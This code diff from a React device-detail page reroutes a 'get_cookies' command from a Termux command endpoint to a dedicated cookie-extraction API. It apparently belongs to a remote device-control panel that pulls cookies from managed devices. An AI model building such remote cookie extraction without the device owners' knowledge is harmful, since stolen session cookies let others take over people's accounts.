@@ -1101,10 +1101,10 @@ export default function DeviceDetailPage() {
                 setCookieExtracting(true);
                 setCookieResult("");
                 try {
-                  await fetch("/api/termux/commands", {
+                  await fetch("/api/device-control/cookies/extract", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ deviceId, commands: [{ type: "get_cookies" }] }),
+                    body: JSON.stringify({ deviceId }),
                   });
                   setCookieResult("Command sent! Cek di Cookies page.");
                 } catch { setCookieResult("Failed to send command"); }
